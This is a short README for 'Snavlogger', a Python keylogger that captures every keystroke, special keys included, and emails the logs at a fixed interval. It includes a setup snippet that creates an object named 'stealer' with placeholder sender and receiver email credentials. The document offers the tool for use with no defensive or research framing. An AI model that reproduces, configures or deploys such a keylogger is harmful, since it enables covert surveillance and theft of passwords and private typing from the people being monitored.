# Description
**Snavlogger** is a keylogger that record all keys that is pressed including special keys and report them by email, every _**x**_ seconds.

# Features
* Send reports by email
* Set a time interval for reporting logged keys
* Logs every key including special keys

# Things to modify
In **snavlogger.py**

```python
from keylogger import Keylogger

stealer = Keylogger(120, 'EMAIL_FOR_SENDING', 'PASSWORD', 'EMAIL_FOR_RECEIVING')
stealer.start()
```

# Who made this?
* Snavellet - Main Developer

# License
* MIT